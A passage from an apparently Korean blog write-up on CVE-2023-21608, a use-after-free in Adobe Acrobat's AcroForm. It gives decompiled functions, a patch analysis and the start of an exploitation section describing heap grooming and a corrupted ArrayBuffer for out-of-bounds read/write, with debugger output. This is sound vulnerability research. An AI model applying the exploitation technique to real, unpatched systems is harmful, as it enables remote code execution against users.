&#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; <code>PointerType</code>&#xC758; &#xC0BD;&#xC785;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xB2E4;&#xC74C; <code>CAggToESVal</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xACE0; &#xC774;&#xD6C4; &#xC544;&#xB798;&#xC758; <code>DeleteFromGlobalHashTable</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="DeleteGlobalFromHashTable"><a href="#DeleteGlobalFromHashTable" class="headerlink" title="DeleteGlobalFromHashTable"></a>DeleteGlobalFromHashTable</h2><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">DeleteFromGlobalHashTable</span><span class="hljs-params">(_DWORD *pData)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">if</span> ( *pData )                                   {    result = DeleteFromHashTable(&amp;GlobalHashTable, pData);    *pData = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">return</span> result;}</code></pre><p><code>GlobalHashTable</code>&#xACFC; <code>pData</code>&#xB97C; &#xC778;&#xC790;&#xB85C; <code>DeleteFromHashTable</code>&#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;</p><h3 id="DeleteFromHashTable"><a href="#DeleteFromHashTable" class="headerlink" title="DeleteFromHashTable"></a>DeleteFromHashTable</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">DeleteFromHashTable</span><span class="hljs-params">(HashTable *hashTable, _DWORD *pData)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> DataHash; <span class="hljs-comment">// ebx</span>  HashBucketEntry *v4; <span class="hljs-comment">// edi</span>  ListEntry result; <span class="hljs-comment">// [esp+Ch] [ebp-8h] BYREF</span>  DataHash = hashFunction(<span class="hljs-number">0x811C9DC5</span>, pData, <span class="hljs-number">4u</span>);  v4 = FindDataFromHashTable(hashTable, &amp;result, pData, DataHash)-&gt;Blink;  <span class="hljs-keyword">if</span> ( !v4 )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                   <span class="hljs-comment">// Not Found, No deletion</span>  UnlinkTargetFromBucketEntryHeader(hashTable, v4, DataHash &amp; hashTable-&gt;HashBuckets.BucketMaxIndex);  UnlinkSelf((<span class="hljs-keyword">int</span> *)&amp;hashTable-&gt;DefaultHead, v4);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>&#xD638;&#xCD9C;&#xB41C; <code>DeleteFromHashTable</code>&#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>hashFunction</code>&#xACFC; <code>FindDataFromHashTable</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xBA74; &#xB2E4;&#xB978; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xAC70;&#xD560; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; &#xBA3C;&#xC800; &#xC544;&#xB798;&#xC758; <code>UnlinkTargetFromBucketEntryHeader</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="UnlinkTargetFromBucketEntryHeader"><a href="#UnlinkTargetFromBucketEntryHeader" class="headerlink" title="UnlinkTargetFromBucketEntryHeader"></a>UnlinkTargetFromBucketEntryHeader</h3><pre><code class="hljs c"><span class="hljs-function">HashBucketEntry *__thiscall <span class="hljs-title">UnlinkTargetFromBucketEntryHeader</span><span class="hljs-params">(HashTable *hashTable, HashBucketEntry *target, <span class="hljs-keyword">int</span> Idx)</span></span><span class="hljs-function"></span>{  HashBucketEntryHeader *v3; <span class="hljs-comment">// edx</span>  HashBucketEntry *result; <span class="hljs-comment">// eax</span>  v3 = hashTable-&gt;HashBuckets.HashBucketBegin;  result = target;  <span class="hljs-keyword">if</span> ( v3[Idx].BucketTail == target )             {    <span class="hljs-keyword">if</span> ( v3[Idx].BucketHead == target )            {      result = hashTable-&gt;DefaultHead;      v3[Idx].BucketHead = result;    }    <span class="hljs-keyword">else</span>    {      result = target-&gt;list_entry.list_entry.Blink;    }    v3[Idx].BucketTail = result;  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3[Idx].BucketHead == target )  {    result = target-&gt;list_entry.list_entry.Flink;    v3[Idx].BucketHead = target-&gt;list_entry.list_entry.Flink;  }  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>BucketHead</code>&#xC640; <code>BucketTail</code>&#xAC00; &#xC81C;&#xAC70;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB178;&#xB4DC;&#xC778; <code>target</code>&#xACFC; &#xAC19;&#xC740;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; Head&#xB098; Tail &#xD639;&#xC740; &#xC591;&#xCABD; &#xBAA8;&#xB450;&#xB97C; &#xAC31;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; <code>target</code>&#xC774; <code>BucketHead</code>&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>target-&gt;Flink</code>&#xB97C; &#xC0C8;&#xB85C;&#xC6B4; Head&#xB85C; &#xAC31;&#xC2E0;&#xD558;&#xACE0; <code>BucketTail</code>&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>target-&gt;Blink</code>&#xB97C; &#xC0C8;&#xB85C;&#xC6B4; Tail&#xB85C; &#xAC31;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. <code>target</code>&#xC774; &#xBC84;&#xD0B7;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC720;&#xC77C;&#xD55C; &#xB178;&#xB4DC;&#xB77C;&#xBA74; <code>BucketHead</code>&#xC640; <code>BucketTail</code>&#xC744; &#xBAA8;&#xB450; <code>hashTable-&gt;DefaultHead</code>&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xC5EC; &#xBC84;&#xD0B7;&#xC774; &#xBE44;&#xC5C8;&#xC74C;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p><code>DeleteFromHashTable</code>&#xC5D0;&#xC11C; &#xC774; &#xD568;&#xC218;&#xAC00; &#xBC18;&#xD658;&#xD55C; &#xB2E4;&#xC74C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB798;&#xC758; <code>UnlinkSelf</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;</p><h3 id="UnlinkSelf"><a href="#UnlinkSelf" class="headerlink" title="UnlinkSelf"></a>UnlinkSelf</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">UnlinkSelf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a1, HashBucketEntry *target)</span></span><span class="hljs-function"></span>{  HashBucketEntry *v2; <span class="hljs-comment">// esi</span>  v2 = target-&gt;list_entry.list_entry.Flink;  --a1[<span class="hljs-number">1</span>];                                      <span class="hljs-comment">// decrease length</span>  target-&gt;list_entry.list_entry.Blink-&gt;list_entry.list_entry.Flink = v2;<span class="hljs-comment">// Unlink</span>  v2-&gt;list_entry.list_entry.Blink = target-&gt;list_entry.list_entry.Blink;  sub_20867B89(target);                         <span class="hljs-comment">// free</span>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)v2;}</code></pre><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790; <code>a1</code>&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB41C; <code>GlobalHashTable.DefaultHead</code>&#xC758; &#xC8FC;&#xC18C;&#xC5D0; 4&#xB97C; &#xB354;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>length</code>&#xB97C; 1 &#xAC10;&#xC18C;&#xC2DC;&#xD0A4;&#xACE0; &#xC81C;&#xAC70;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB178;&#xB4DC;&#xC778; <code>target</code>&#xC744; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>sub_20867B89</code>&#xC5D0;&#xC11C;&#xB294; <code>target</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xD574;&#xC81C;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="Patched-SetRichValueEventProp-amp-GetRichValueEventProp"><a href="#Patched-SetRichValueEventProp-amp-GetRichValueEventProp" class="headerlink" title="Patched : SetRichValueEventProp &amp; GetRichValueEventProp"></a>Patched : SetRichValueEventProp &amp; GetRichValueEventProp</h2><p><code>IsDataInGlobalHashTable</code>, <code>InsertToGlobalHashTable</code>, <code>DeleteFromGlobalHashTable</code>&#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>SetRichValueEventProp</code> &#xD568;&#xC218;&#xC5D0;&#xB3C4; <code>GetRichValueEventProp</code>&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC774;&#xB7EC;&#xD55C; &#xCF54;&#xB4DC;&#xB4E4;&#xC774; &#xCD94;&#xAC00;&#xB428;&#xC73C;&#xB85C;&#xC368; &#xC5B4;&#xB5BB;&#xAC8C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;!</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">SetRichValueEventProp</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span> *a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span></span><span class="hljs-function"></span>{  ...  <span class="hljs-keyword">if</span> ( v7() )  {    ...    <span class="hljs-keyword">if</span> ( !v8() )    {      ...      <span class="hljs-keyword">if</span> ( (_WORD)v34 == v16()        || (v29 = <span class="hljs-number">0</span>,            v28 = (<span class="hljs-keyword">int</span>)<span class="hljs-string">&quot;bWillCommit&quot;</span>,            v27 = v4,            v17 = *(<span class="hljs-keyword">int</span> (**)(<span class="hljs-keyword">void</span>))(dword_2147CFA0 + <span class="hljs-number">196</span>),            __guard_check_icall_fptr(v4, <span class="hljs-string">&quot;bWillCommit&quot;</span>),            v18 = v17(),            (_WORD)v18) )      {LABEL_12:        v29 = <span class="hljs-string">&quot;CAgg_P&quot;</span>;        v18 = sub_20A4BC05(v4, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;richValue&quot;</span>);        PointerType = (_DWORD *)v18;        <span class="hljs-keyword">if</span> ( v18 )        {          LOBYTE(v18) = IsDataInGlobalHashTable(v18);          <span class="hljs-keyword">if</span> ( !(_BYTE)v18 )                    <span class="hljs-comment">// Not in process</span>          {            v21 = InsertToGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;PointerTypePtr, (<span class="hljs-keyword">int</span>)PointerType);            LOBYTE(v36) = <span class="hljs-number">1</span>;            CAgg::Convert((<span class="hljs-keyword">int</span>)v21, v22, PointerType, <span class="hljs-number">0</span>);            sub_20AD749C((<span class="hljs-keyword">int</span>)PointerType, v33, <span class="hljs-number">0</span>);<span class="hljs-comment">// GetRichValueEventProp called</span>            v23 = *(<span class="hljs-keyword">void</span> (**)(<span class="hljs-keyword">void</span>))(dword_2147CFA0 + <span class="hljs-number">200</span>);            v29 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">wchar_t</span> *)<span class="hljs-number">1</span>;            __guard_check_icall_fptr(v4, <span class="hljs-string">&quot;bModified&quot;</span>);            v23();            v18 = DeleteFromGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;PointerTypePtr);          }        }      }      sub_20AAE6F7(v18, v19, v35);    }    result = <span class="hljs-number">1</span>;  }  <span class="hljs-keyword">else</span>  {    ...  }  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xBC84;&#xADF8;&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC774; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xC801;&#xC6A9;&#xB420; &#xACBD;&#xC6B0;, &#xBA3C;&#xC800; <code>SetRichValueEventProp</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>IsDataInGlobalHashTable</code>&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC774; 0&#xC778; &#xACBD;&#xC6B0; <code>InsertToGlobalHashTable</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>PointerType</code>&#xC774; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xCD94;&#xAC00;&#xB420; &#xAC83;&#xC774;&#xACE0; &#xC774;&#xD6C4; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>sub_20AD749C</code>&#xD568;&#xC218;&#xB85C; &#xC778;&#xD574; <code>GetRichValueEventProp</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xACE0; &#xC544;&#xB798;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; <code>IsDataInGlobalHashTable</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">GetRichValueEventProp</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span> *a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span></span><span class="hljs-function"></span>{  ...  <span class="hljs-keyword">if</span> ( v5() )  {    ...  }  <span class="hljs-keyword">else</span>  {    ...    <span class="hljs-keyword">if</span> ( v31      &amp;&amp; (v23 = <span class="hljs-string">&quot;richValue&quot;</span>,          v22 = (<span class="hljs-keyword">int</span>)v31,          v11 = *(<span class="hljs-keyword">unsigned</span> __int16 (__fastcall **)(<span class="hljs-keyword">int</span>))(dword_2147CFA0 + <span class="hljs-number">180</span>),          v12 = __guard_check_icall_fptr(v31, <span class="hljs-string">&quot;richValue&quot;</span>),          v11(v12)) )    {      v23 = <span class="hljs-string">&quot;CAgg_P&quot;</span>;      PointerType = sub_20A4BC05(v31, (<span class="hljs-keyword">wchar_t</span> *)<span class="hljs-string">&quot;richValue&quot;</span>);      PointerType_1 = PointerType;      <span class="hljs-keyword">if</span> ( PointerType )      {        LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);        <span class="hljs-keyword">if</span> ( !(_BYTE)PointerType )        {          v15 = InsertToGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31, PointerType_1);          LOBYTE(v33) = <span class="hljs-number">4</span>;          CAggToESVal((<span class="hljs-keyword">int</span>)v15, v16, PropName, PointerType_1);          PointerType = DeleteFromGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31);        }      }    }    ...  }  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xBB34;&#xB7F0; &#xAC80;&#xC99D; &#xC5C6;&#xC774; <code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC5F4;&#xAC70; &#xB3C4;&#xC911;&#xC5D0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB4E4;&#xC774; &#xD574;&#xC81C;&#xB418;&#xACE0; &#xC774;&#xD6C4; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB418;&#xC9C0;&#xB9CC; &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; <code>CAggToESVal</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; <code>IsDataInGlobalHashTable</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;&#xC758; <code>PointerType</code>&#xC740; <code>SetRichValueEventProp</code>&#xC758; <code>PointerType</code>&#xACFC; &#xAC19;&#xACE0; <code>SetRichValueEventProp</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>InsertToGlobalHashTable</code> &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xC774;&#xBBF8; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; <code>GetRichValueEventProp</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>IsDataInGlobalHashTable</code>&#xC740; <code>true</code>&#xB97C; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xB418;&#xACE0; <code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; <code>richValue</code>&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB294; <code>richChange</code>&#xC640; &#xAD00;&#xB828;&#xB41C; <code>SetRichChangeEventProp</code>&#xD568;&#xC218;&#xC640; <code>GetRichChangeEventProp</code>&#xD568;&#xC218;&#xB3C4; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="4-Exploitation"><a href="#4-Exploitation" class="headerlink" title="4. Exploitation"></a>4. Exploitation</h1><hr><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xB300;&#xB9DD;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xB9CC;&#xC774; &#xB0A8;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0;&#xC11C; &#xC598;&#xAE30;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C;&#xB3C4; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC774;&#xC804;&#xAE4C;&#xC9C0; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5D4;&#xC9C4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xACBD;&#xD5D8;&#xC774; &#xC5C6;&#xC5C8;&#xAE30;&#xC5D0; &#xAD49;&#xC7A5;&#xD788; &#xC2E0;&#xC120;&#xD558;&#xAC8C; &#xB290;&#xAEF4;&#xC9C0;&#xAE30;&#xB3C4; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%205.png" alt="Untitled"></p><blockquote><p><del>&#xADF8;&#xB798;&#xB3C4; &#xB09C; &#xD30C;&#xC774;&#xC36C;&#xC774; &#xC88B;&#xC544;</del></p></blockquote><p>RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC704;&#xD574; &#xBA3C;&#xC800; &#xD799; &#xADF8;&#xB8E8;&#xBC0D;&#xC744; &#xD1B5;&#xD574; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xD2B9;&#xC815; <code>ArrayBuffer</code>&#xC758; length&#xAC00; &#xB36E;&#xC5B4; &#xC4F0;&#xC774;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC774;&#xB97C; OOB Read/Write&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="1-Create-Corrupted-ArrayBuffer"><a href="#1-Create-Corrupted-ArrayBuffer" class="headerlink" title="1. Create Corrupted ArrayBuffer"></a>1. Create Corrupted ArrayBuffer</h2><p>&#xC544;&#xB798;&#xB294; page-heap&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <code>CAgg::operator[]</code>&#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="CAgg-operator"><a href="#CAgg-operator" class="headerlink" title="CAgg::operator[]"></a>CAgg::operator[]</h3><pre><code class="hljs c"><span class="hljs-keyword">int</span> __userpurge CAgg::<span class="hljs-keyword">operator</span>[]@&lt;eax&gt;(<span class="hljs-keyword">int</span> *<span class="hljs-keyword">this</span>@&lt;ecx&gt;, <span class="hljs-keyword">bool</span> *a2@&lt;ebx&gt;, <span class="hljs-keyword">wchar_t</span> *someID){...  <span class="hljs-keyword">if</span> ( *<span class="hljs-keyword">this</span> == <span class="hljs-number">0x13</span> )                          <span class="hljs-comment">// this-&gt;type</span>  {    v6 = *(<span class="hljs-keyword">int</span> (__fastcall **)(<span class="hljs-keyword">int</span>))(dword_21473CA4 + <span class="hljs-number">28</span>);    v7 = __guard_check_icall_fptr(someID);    v8 = (<span class="hljs-keyword">void</span> *)v6(v7);    v15 = (<span class="hljs-keyword">wchar_t</span> *)sub_20867317(v8, <span class="hljs-number">1</span>);    v9 = (<span class="hljs-keyword">int</span> *)<span class="hljs-keyword">this</span>[<span class="hljs-number">2</span>];    v16 = <span class="hljs-number">0</span>;    v11 = *(_DWORD *)sub_20AA6EED((<span class="hljs-keyword">int</span>)a2a, v10, v9, (<span class="hljs-keyword">int</span>)&amp;v15, (<span class="hljs-keyword">int</span>)a2a);    v16 = <span class="hljs-number">1</span>;    <span class="hljs-keyword">if</span> ( v15 )      sub_208679A2(v15);    result = v11 + <span class="hljs-number">24</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> ( *<span class="hljs-keyword">this</span> == <span class="hljs-number">0x14</span> )    {      v4 = (_DWORD *)<span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::<span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">this</span>[<span class="hljs-number">2</span>], (<span class="hljs-keyword">int</span>)v14, v12);    }    <span class="hljs-keyword">else</span>    {      CAgg::Convert((<span class="hljs-keyword">int</span>)<span class="hljs-keyword">this</span>, (_DWORD *)<span class="hljs-number">0x14</span>);      v4 = (_DWORD *)<span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>,CAgg&gt;::<span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">this</span>[<span class="hljs-number">2</span>], (<span class="hljs-keyword">int</span>)a2a, &amp;someID);<span class="hljs-comment">// this-&gt;map</span>    }    result = *v4 + <span class="hljs-number">24</span>;  }  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xD799; &#xADF8;&#xB8E8;&#xBC0D;&#xC774; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;&#xB294; <code>EScript_ESObjectEnum_CallbackProc</code>&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xACF5;&#xACA9;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xCEE8;&#xD2B8;&#xB864;&#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; <code>CAgg::operator[]</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs apache"><span class="hljs-attribute">eax</span>=<span class="hljs-number">00001</span>b<span class="hljs-number">36</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">2909</span>d<span class="hljs-number">478</span> edx=<span class="hljs-number">10</span>e<span class="hljs-number">60</span>da<span class="hljs-number">0</span> esi=<span class="hljs-number">71</span>eaef<span class="hljs-number">50</span> edi=<span class="hljs-number">2909</span>d<span class="hljs-number">478</span><span class="hljs-attribute">eip</span>=<span class="hljs-number">63</span>ac<span class="hljs-number">2</span>a<span class="hljs-number">4</span>b esp=<span class="hljs-number">0457</span>ac<span class="hljs-number">14</span> ebp=<span class="hljs-number">0457</span>ac<span class="hljs-number">28</span> iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nc<span class="hljs-attribute">cs</span>=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002</span>b  ds=<span class="hljs-number">002</span>b  es=<span class="hljs-number">002</span>b  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002</span>b             efl=<span class="hljs-number">00200246</span><span class="hljs-attribute">AcroForm</span>!DllUnregisterServer+<span class="hljs-number">0</span>x<span class="hljs-number">69</span>eb:<span class="hljs-attribute">63ac2a4b</span> e<span class="hljs-number">83</span>b<span class="hljs-number">410000</span>      call    AcroForm!DllUnregisterServer+<span class="hljs-number">0</span>xab<span class="hljs-number">2</span>b (<span class="hljs-number">63</span>ac<span class="hljs-number">6</span>b<span class="hljs-number">8</span>b)<span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; dd ecx // ecx+<span class="hljs-number">8</span> == this-&gt;map<span class="hljs-attribute">2909d478</span>  <span class="hljs-number">4</span>e<span class="hljs-number">4</span>e<span class="hljs-number">4</span>d<span class="hljs-number">4</span>d <span class="hljs-number">50504</span>f<span class="hljs-number">4</span>f *<span class="hljs-number">20000058</span>* <span class="hljs-number">54545353</span><span class="hljs-attribute">2909d488</span>  <span class="hljs-number">56565555</span> <span class="hljs-number">58585757</span> <span class="hljs-number">5</span>a<span class="hljs-number">5</span>a<span class="hljs-number">5959</span> <span class="hljs-number">5</span>c<span class="hljs-number">5</span>c<span class="hljs-number">5</span>b<span class="hljs-number">5</span>b<span class="hljs-attribute">2909d498</span>  <span class="hljs-number">5</span>e<span class="hljs-number">5</span>e<span class="hljs-number">5</span>d<span class="hljs-number">5</span>d <span class="hljs-number">60605</span>f<span class="hljs-number">5</span>f <span class="hljs-number">00006161</span> <span class="hljs-number">00000000</span><span 